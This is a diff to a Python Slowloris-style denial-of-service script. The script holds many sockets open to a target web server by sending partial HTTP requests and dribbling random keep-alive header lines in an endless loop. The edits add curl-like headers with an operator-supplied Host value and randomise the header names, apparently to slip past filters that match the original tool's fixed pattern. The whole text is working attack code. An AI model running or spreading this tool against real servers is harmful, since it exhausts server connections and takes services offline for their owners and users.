@@ -6,23 +6,28 @@ import socket
 import time
 #from progress.bar import Bar
 
-regular_headers = [ "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
-                    "Accept-language: en-US,en,q=0.5"]
+#regular_headers = [ "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
+#                    "Accept-language: en-US,en,q=0.5"]
+
+#curl headers
+regular_headers = ["Host: " + str(sys.argv[5]) , "User-Agent: curl/7.58.0", "Accept: */*"]
 
 def init_socket(ip,port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(4)
     s.connect((ip,int(port)))
-    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode('UTF-8'))
-
+    req = "GET /" + str(random.randint(1,10)) + ".html HTTP/1.1\r\n"
+    req = req.format(random.randint(0,2000)).encode('UTF-8')
     for header in regular_headers:
-        s.send('{}\r\n'.format(header).encode('UTF-8'))
+        req = req + '{}\r\n'.format(header).encode('UTF-8')
+
+    s.send(req)
 
     return s
 
 def main():
-    if len(sys.argv)<5:
-        print(("Usage: {} example.com 80 100 10".format(sys.argv[0])))
+    if len(sys.argv)<6:
+        print(("Usage: {} 10.1.5.2 80 100 10 <ip_addrsrc>".format(sys.argv[0])))
         return
 
     ip = sys.argv[1]
@@ -43,16 +48,17 @@ def main():
     #bar.finish()
 
     while True:
-        print(("\033[0;37;40m Sending Keep-Alive Headers to {}".format(len(socket_list))))
+        print(("Sending Keep-Alive Headers to {}".format(len(socket_list))))
 
         for s in socket_list:
             try:
-                s.send("X-a {}\r\n".format(random.randint(1,5000)).encode('UTF-8'))
+                req = str(random.choice('ABCDEFGHIJKLMNOPQRSTUWXYZ')) + "-" + str(random.choice('abcdefghijklmnopqrstuvwxyz')) + " {}\r\n"
+                s.send(req.format(random.randint(1,5000)).encode('UTF-8'))
             except socket.error:
                 socket_list.remove(s)
 
         for _ in range(socket_count - len(socket_list)):
-            print(("\033[1;34;40m {}Re-creating Socket...".format("\n")))
+            print(("Re-creating Socket...".format("\n")))
             try:
                 s=init_socket(ip,port)
                 if s:
